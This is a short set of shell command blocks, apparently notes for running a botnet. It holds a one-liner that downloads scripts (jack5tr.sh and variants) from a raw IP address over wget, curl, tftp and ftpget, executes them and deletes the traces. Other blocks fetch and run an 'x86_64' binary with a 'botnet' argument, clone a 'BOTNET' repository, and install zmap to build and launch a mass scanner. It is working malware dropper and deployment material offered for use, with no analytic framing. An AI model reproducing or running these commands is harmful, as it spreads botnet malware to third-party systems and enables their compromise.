```
yum install wget -y && cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.183.118.73/jack5tr.sh; curl -OL http://103.183.118.73/jack5tr.sh; chmod 777 jack5tr.sh; sh jack5tr.sh; tftp 103.183.118.73 -c get jack5tr.sh; chmod 777 jack5tr.sh; sh jack5tr.sh; tftp -r jack5tr2.sh -g 103.183.118.73; chmod 777 jack5tr2.sh; sh jack5tr2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.183.118.73 jack5tr1.sh jack5tr1.sh; sh jack5tr1.sh; rm -rf jack5tr.sh jack5tr.sh jack5tr2.sh jack5tr1.sh; rm -rf *; cd /root/
```
```
cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL https://raw.githubusercontent.com/giseleospital254/a/main/x86_64 && chmod 777 x86_64 && ./x86_64 botnet && rm -rf x86_64 && cd /root/ && clear
```
```
cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://103.183.118.73/x86_64 && chmod 777 x86_64 && ./x86_64 botnet && rm -rf x86_64 && cd /root/ && clear
```
```
git clone https://github.com/SPEED4G-Official/BOTNET.git && cd BOTNET/SCAN && mv android /root/ && cd ~ && rm -rf BOTNET && cd android
```
```
yum install git -y
yum install nano -y
yum install screen -y
yum install epel-release -y 
yum install zmap -y 
yum install gcc gcc-c++ -y 
```
```
sh build.sh
```
```
cd android && screen sh scan.sh
```
